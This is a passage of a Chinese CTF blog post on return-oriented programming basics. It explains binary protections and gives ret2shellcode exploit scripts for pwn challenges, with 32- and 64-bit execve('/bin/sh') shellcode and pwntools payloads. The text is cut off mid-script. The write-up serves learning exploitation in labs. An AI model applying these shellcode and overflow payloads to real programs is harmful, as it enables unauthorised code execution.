<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>基础rop | Randolfluo's blog</title><meta name="author" content="Randolf luo"><meta name="copyright" content="Randolf luo"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="基础rop">
<meta property="og:type" content="article">
<meta property="og:title" content="基础rop">
<meta property="og:url" content="http://randolfluo.github.io/2023/12/23/pwn/%E5%9F%BA%E7%A1%80rop/index.html">
<meta property="og:site_name" content="Randolfluo&#39;s blog">
<meta property="og:description" content="基础rop">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://randolfluo.github.io/img/cover2.jpg">
<meta property="article:published_time" content="2023-12-22T16:00:00.000Z">
<meta property="article:modified_time" content="2024-07-11T16:00:00.000Z">
<meta property="article:author" content="Randolf luo">
<meta property="article:tag" content="ctf">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://randolfluo.github.io/img/cover2.jpg"><link rel="shortcut icon" href="/img/avater.jpg"><link rel="canonical" href="http://randolfluo.github.io/2023/12/23/pwn/%E5%9F%BA%E7%A1%80rop/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":150,"languages":{"author":"作者: Randolf luo","link":"链接: ","source":"来源: Randolfluo's blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'null',
  Snackbar: {"chs_to_cht":"已切换为繁体中文","cht_to_chs":"已切换为简体中文","day_to_night":"已切换为深色模式","night_to_day":"已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: true,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '基础rop',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  isShuoshuo: false
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avater.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">111</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">33</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">34</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/cover2.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Randolfluo's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">基础rop</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">基础rop</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-12-22T16:00:00.000Z" title="发表于 2023-12-23 00:00:00">2023-12-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-07-11T16:00:00.000Z" title="更新于 2024-07-12 00:00:00">2024-07-12</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/">ctf</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/pwn/">pwn</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">2.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>11分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p>ROP的全称为Return-oriented programming（返回导向编程）</p>
<p>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</p>
<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><p><img src="../../img/image-20231205210530558.png" alt="image-20231205210530558"></p>
<h5 id="Arch"><a href="#Arch" class="headerlink" title="Arch"></a>Arch</h5><p>程序架构信息，判断是64位还是32位，exp编写的时候是p64还是p32,是大端序还是小端序</p>
<h5 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h5><p>RELRO 是 “Relocation Read-Only” 的缩写，用于保护程序的全局偏移表 (GOT) 免受攻击。</p>
<h5 id="Stack"><a href="#Stack" class="headerlink" title="Stack"></a>Stack</h5><p>Stack-canary（金丝雀保护），用于检测栈溢出攻击。它是一个随机的值，被插入到栈帧中，并在函数返回时被检查。</p>
<h5 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h5><p>NX enabled如果这个保护开启就是意味着栈中数据没有执行权限，如此一来，当攻击者在堆栈上部署自己的shellcode并触发时，智慧直接造成程序的崩溃，但是可以利用rop这种方法绕过</p>
<h5 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h5><p>PIE 是 “Position Independent Executable” 的缩写，它表示程序是否是位置无关的。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>ret2shellcode</td>
<td>注入代码</td>
</tr>
<tr>
<td>ret2syscall</td>
<td>拼接需要执行系统调用的条件代码</td>
</tr>
<tr>
<td>ret2libc</td>
<td>调用</td>
</tr>
</tbody>
</table>
</div>
<p>`</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>程序架构信息</th>
<th>条件</th>
</tr>
</thead>
<tbody>
<tr>
<td>32位</td>
<td>Edx=0 —— EcX=0 —— [Ebx]=’/bin/sh’——  Eax=0xb  —— Int 0x80</td>
</tr>
<tr>
<td>64位</td>
<td>Rdx=0 —— Rsi=0 —— [Rdi]=’/bin/sh’ —— Rax=0x3b —— syscall</td>
</tr>
</tbody>
</table>
</div>
<h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。</p>
<h4 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h4><h4 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h4><h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>ret2shellcode是指攻击者需要自己将调用shell的机器码（也称shellcode）注入至内存中，随后利用栈溢出复写return_address，进而使程序跳转至shellcode所在内存。<code>前提是无NX保护,或bss段可执行</code><br/></p>
<h4 id="32位与64位操作系统的shellcraft-生成的shellcode"><a href="#32位与64位操作系统的shellcraft-生成的shellcode" class="headerlink" title="32位与64位操作系统的shellcraft()生成的shellcode"></a>32位与64位操作系统的shellcraft()生成的shellcode</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>context(log_level = <span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>shellcode=asm(shellcraft.sh())</span><br><span class="line">[DEBUG] Assembling</span><br><span class="line">    .section .shellcode,<span class="string">&quot;awx&quot;</span></span><br><span class="line">    .<span class="keyword">global</span> _start</span><br><span class="line">    .<span class="keyword">global</span> __start</span><br><span class="line">    _start:</span><br><span class="line">    __start:</span><br><span class="line">    .intel_syntax noprefix</span><br><span class="line">    .p2align <span class="number">0</span></span><br><span class="line">        /* execve(path=<span class="string">&#x27;/bin///sh&#x27;</span>, argv=[<span class="string">&#x27;sh&#x27;</span>], envp=<span class="number">0</span>) */</span><br><span class="line">        /* push <span class="string">b&#x27;/bin///sh\x00&#x27;</span> */</span><br><span class="line">        push <span class="number">0x68</span></span><br><span class="line">        push <span class="number">0x732f2f2f</span></span><br><span class="line">        push <span class="number">0x6e69622f</span></span><br><span class="line">        mov ebx, esp</span><br><span class="line">        /* push argument array [<span class="string">&#x27;sh\x00&#x27;</span>] */</span><br><span class="line">        /* push <span class="string">&#x27;sh\x00\x00&#x27;</span> */</span><br><span class="line">        push <span class="number">0x1010101</span></span><br><span class="line">        xor dword ptr [esp], <span class="number">0x1016972</span></span><br><span class="line">        xor ecx, ecx</span><br><span class="line">        push ecx /* null terminate */</span><br><span class="line">        push <span class="number">4</span></span><br><span class="line">        pop ecx</span><br><span class="line">        add ecx, esp</span><br><span class="line">        push ecx /* <span class="string">&#x27;sh\x00&#x27;</span> */</span><br><span class="line">        mov ecx, esp</span><br><span class="line">        xor edx, edx</span><br><span class="line">        /* call execve() */</span><br><span class="line">        push <span class="number">11</span> /* <span class="number">0xb</span> */</span><br><span class="line">        pop eax</span><br><span class="line">        <span class="built_in">int</span> <span class="number">0x80</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>shellcode</span><br><span class="line"><span class="string">b&#x27;jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80&#x27;</span>l</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode))</span><br><span class="line"><span class="number">44</span> (<span class="number">0x2c</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>context(log_level = <span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>shellcode=asm(shellcraft.sh())</span><br><span class="line">[DEBUG] cpp -C -nostdinc -undef -P -I/home/randolfluo/.local/lib/python3<span class="number">.8</span>/site-packages/pwnlib/data/includes /dev/stdin</span><br><span class="line">[DEBUG] Assembling</span><br><span class="line">    .section .shellcode,<span class="string">&quot;awx&quot;</span></span><br><span class="line">    .<span class="keyword">global</span> _start</span><br><span class="line">    .<span class="keyword">global</span> __start</span><br><span class="line">    _start:</span><br><span class="line">    __start:</span><br><span class="line">    .intel_syntax noprefix</span><br><span class="line">    .p2align <span class="number">0</span></span><br><span class="line">        /* execve(path=<span class="string">&#x27;/bin///sh&#x27;</span>, argv=[<span class="string">&#x27;sh&#x27;</span>], envp=<span class="number">0</span>) */</span><br><span class="line">        /* push <span class="string">b&#x27;/bin///sh\x00&#x27;</span> */</span><br><span class="line">        push <span class="number">0x68</span></span><br><span class="line">        mov rax, <span class="number">0x732f2f2f6e69622f</span></span><br><span class="line">        push rax</span><br><span class="line">        mov rdi, rsp</span><br><span class="line">        /* push argument array [<span class="string">&#x27;sh\x00&#x27;</span>] */</span><br><span class="line">        /* push <span class="string">b&#x27;sh\x00&#x27;</span> */</span><br><span class="line">        push <span class="number">0x1010101</span> ^ <span class="number">0x6873</span></span><br><span class="line">        xor dword ptr [rsp], <span class="number">0x1010101</span></span><br><span class="line">        xor esi, esi /* <span class="number">0</span> */</span><br><span class="line">        push rsi /* null terminate */</span><br><span class="line">        push <span class="number">8</span></span><br><span class="line">        pop rsi</span><br><span class="line">        add rsi, rsp</span><br><span class="line">        push rsi /* <span class="string">&#x27;sh\x00&#x27;</span> */</span><br><span class="line">        mov rsi, rsp</span><br><span class="line">        xor edx, edx /* <span class="number">0</span> */</span><br><span class="line">        /* call execve() */</span><br><span class="line">        push <span class="number">59</span> /* <span class="number">0x3b</span> */</span><br><span class="line">        pop rax</span><br><span class="line">        syscall</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>shellcode</span><br><span class="line"><span class="string">b&#x27;jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(shellcode)</span><br><span class="line"><span class="number">48</span> (<span class="number">0x30</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="shellcode精简版"><a href="#shellcode精简版" class="headerlink" title="shellcode精简版"></a>shellcode精简版</h4><p>转自<a target="_blank" rel="noopener" href="https://www.codenong.com/cs110936441/">linux环境下shellcode的编写：32位和64位 | 码农家园 (codenong.com)</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">#########################################################################</span><br><span class="line">## 一般函数调用参数是压入栈中，这里系统调用使用寄存器</span><br><span class="line">## 需要对如下几个寄存器进行设置，可以比对官方的实现</span><br><span class="line"></span><br><span class="line">  ebx = /bin/sh     ## 第一个参数</span><br><span class="line">  ecx = 0             ## 第二个参数</span><br><span class="line">  edx = 0             ## 第三个参数</span><br><span class="line">  eax = 0xb           ## 0xb为系统调用号，即sys_execve()系统函数对应的序号</span><br><span class="line">  int 0x80            ## 执行系统中断</span><br><span class="line">#########################################################################</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    push 0x68732f        </span><br><span class="line">    push 0x6e69622f      </span><br><span class="line">    mov ebx, esp</span><br><span class="line">    xor edx, edx</span><br><span class="line">    xor ecx, ecx</span><br><span class="line">    mov al, 0xb       </span><br><span class="line">    int 0x80</span><br><span class="line">    ## 汇编之后字节长度为20字节</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> ######################################################################</span><br><span class="line">## 64位linux下，默认前6个参数都存入寄存器，所以这里没的说也使用寄存器</span><br><span class="line">## 寄存器存储参数顺序，参数从左到右：rdi, rsi, rdx, rcx, r8, r9</span><br><span class="line"></span><br><span class="line">    rdi = /bin/sh        ## 第一个参数</span><br><span class="line">    rsi = 0              ## 第二个参数</span><br><span class="line">    rdx = 0              ## 第三个参数</span><br><span class="line">    rax = 0x3b           ## 64位下的系统调用号</span><br><span class="line">    syscall              ## 64位使用 syscall</span><br><span class="line">#####################################################################</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    mov rbx, 0x68732f6e69622f  </span><br><span class="line">    push rbx</span><br><span class="line">    push rsp</span><br><span class="line">    pop rdi</span><br><span class="line">    xor esi, esi             </span><br><span class="line">    xor edx, edx               </span><br><span class="line">    push 0x3b</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br><span class="line">    ## 汇编之后字节长度为22字节</span><br></pre></td></tr></table></figure>
<p><img src="../../img/image-20231205211551683.png" alt="image-20231205211551683"></p>
<p>无任何保护，有栈溢出漏洞，但是没有system(“/bin/sh”)类型的函数，因此需要我们在bss段构造一个shell函数</p>
<p><img src="../../img/image-20231205211744904.png" alt="image-20231205211744904"></p>
<p><img src="../../img/image-20231205212113245.png" alt="image-20231205212113245"></p>
<p><img src="../../img/image-20231205214725186.png" alt="image-20231205214725186"></p>
<p>buf2被存放在bss段，bss 是英文 Block by Symbol 的简称。通常用来存放程序中未初始化和初始化为 0的全局变量的一块内存区域</p>
<p><img src="../../img/image-20231205214701101.png" alt="image-20231205214701101"></p>
<p><code>0x0804A080</code>在第三行的范围      发现可读可写，达成<code>ret2shellcode</code>条件</p>
<p>生成字符串确定字符串<code>s</code>到<code>ebp</code>的距离</p>
<p><img src="../../img/image-20231205215121126.png" alt="image-20231205215121126"></p>
<p><img src="../../img/image-20231205215533022.png" alt="image-20231205215533022"></p>
<p>为<code>112（0x6c）</code></p>
<p>payload如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">sh = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh()) <span class="comment">#生成一个用于打开 shell 的 shellcode，并通过 asm 函数将其转换为二进制形式。</span></span><br><span class="line">buf2_addr = <span class="number">0x0804A080</span> </span><br><span class="line">sh.sendline(shellcode.ljust(<span class="number">112</span>,<span class="string">b&#x27;A&#x27;</span>)+ p32(buf2_addr))</span><br><span class="line"><span class="comment">#shellcode.ljust(112, b&#x27;A&#x27;)：这是一个长度为 112 字节的字符串，通过在 shellcode 右侧填充字符 &#x27;A&#x27; 来确保达到指定的长度。</span></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>由于bss段在ubuntu22和ubuntu20设置为不可执行，我们只能在之前的版本（我用的是ubuntu16）运行payload</p>
<p><img src="../../img/image-20231211140320550.png" alt="image-20231211140320550"></p>
<h4 id="mrctf2020-shellcode1"><a href="#mrctf2020-shellcode1" class="headerlink" title="mrctf2020_shellcode1"></a>mrctf2020_shellcode1</h4><p><img src="../../img/image-20231218134827625.png" alt="image-20231218134827625"></p>
<p>payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = process(<span class="string">&#x27;./mrctf2020_shellcode&#x27;</span>)</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="ciscn-2019-s-9"><a href="#ciscn-2019-s-9" class="headerlink" title="ciscn_2019_s_9"></a>ciscn_2019_s_9</h4><p><img src="../../img/image-20231218160423512.png" alt="image-20231218160423512"></p>
<p><img src="../../img/image-20231218170827303.png" alt="image-20231218170827303"></p>
<p><img src="../../img/image-20231218161031569.png" alt="image-20231218161031569"></p>
<p>可以看到<code>未开启NX保护</code>,我们难以确定shellcode在栈中的位置，可以借助<code>hint</code>函数，<code>jmp esp(跳板指令)</code>来跳转到栈上执行，但是由于<code>shellcraft()</code>生成的shellcode过长(0x2c),越过了函数的返回地址。当时我想在<code>跳转到esp</code>后拼接<code>shellcode</code>，但是失败了，原因在于<code>fgets()</code>限制了输入的长度。</p>
<p><img src="../../img/image-20231218194301225.png" alt="image-20231218194301225"></p>
<p><img src="../../img/image-20231218170813121.png" alt="image-20231218170813121"></p>
<p>我们只能自己构造较短的shellcode（）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = process(<span class="string">&#x27;./ciscn_s_9&#x27;</span>)</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment">#shellcode=asm(shellcraft.sh())</span></span><br><span class="line">hint_addr=<span class="number">0x08048554</span></span><br><span class="line"><span class="comment">#payload = b&#x27;A&#x27;*0x24+p32(hint_addr)+shellcode</span></span><br><span class="line">shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    push 0x68732f        </span></span><br><span class="line"><span class="string">    push 0x6e69622f      </span></span><br><span class="line"><span class="string">    mov ebx, esp</span></span><br><span class="line"><span class="string">    xor edx, edx</span></span><br><span class="line"><span class="string">    xor ecx, ecx</span></span><br><span class="line"><span class="string">    mov al,0xb          </span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode=asm(shellcode)</span><br><span class="line">shell = <span class="string">&#x27;&#x27;&#x27;sub esp,0x28;call esp&#x27;&#x27;&#x27;</span></span><br><span class="line">shell = asm(shell)</span><br><span class="line">payload = shellcode.ljust(<span 